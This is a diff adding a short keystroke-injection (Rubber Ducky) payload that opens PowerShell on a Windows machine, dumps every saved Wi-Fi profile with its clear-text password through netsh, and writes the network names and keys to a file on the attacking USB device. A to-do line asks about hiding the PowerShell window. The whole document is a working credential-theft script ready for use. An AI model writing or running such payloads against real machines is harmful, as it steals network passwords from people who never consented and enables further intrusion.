@@ -1,0 +1,13 @@
+REM Hayden Sapp
+REM 2024-03-12
+REM TO-DO Hide powershell?
+
+ATTACKMODE HID STORAGE
+DELAY 2000
+
+GUI r
+DELAY 100
+STRINGLN powershell
+DELAY 700
+STRINGLN $m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;$d=netsh wlan show profile;$d=$d | Where-Object{$_ -match "All User Profile"};$d=$d -split ": " | Where-Object{$_ -notmatch "All User Profile"};$p=$d | ForEach-Object -process{netsh wlan show profiles $_ key=clear};$p | Select-String "SSID name","Key Content" >> $m':\'wireless'.txt'
+DELAY 2000
